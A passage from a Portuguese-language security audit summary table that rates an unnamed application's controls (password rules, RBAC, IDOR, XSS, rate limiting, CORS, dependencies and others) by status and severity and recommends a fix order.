| 5 | Verificação de e-mail | INSUFICIENTE/AUSENTE (N/A ao desenho atual) | — |
| 6 | Requisitos mínimos de senha | VULNERÁVEL | Alta |
| 7 | OAuth no painel admin | INSUFICIENTE/AUSENTE (N/A, sem OAuth) | — |
| 8 | RLS / controle no banco | VULNERÁVEL | Alta |
| 9 | RBAC só no front-end | VULNERÁVEL | Crítica |
| 10 | IDs previsíveis (IDOR) | VULNERÁVEL | Alta |
| 11 | SQL Injection | CONFORME | — |
| 12 | Validação de schema | INSUFICIENTE/AUSENTE | — |
| 13 | XSS via innerHTML | VULNERÁVEL | Alta |
| 14 | Mass Assignment | VULNERÁVEL | Alta |
| 15 | Rate limiting | VULNERÁVEL | Crítica |
| 16 | CORS permissivo | VULNERÁVEL | Alta |
| 17 | Webhook sem HMAC | VULNERÁVEL | Média |
| 18 | Upload sem validação | VULNERÁVEL | Média |
| 19 | Stack traces expostos | VULNERÁVEL | Média |
| 20 | Dependências com CVE | VULNERÁVEL | Crítica |

**Prioridade de correção recomendada:** Itens 4, 9 e 15 (que juntos permitem tomada de conta total sem qualquer autenticação) primeiro; em seguida 16 e 20; depois os demais.
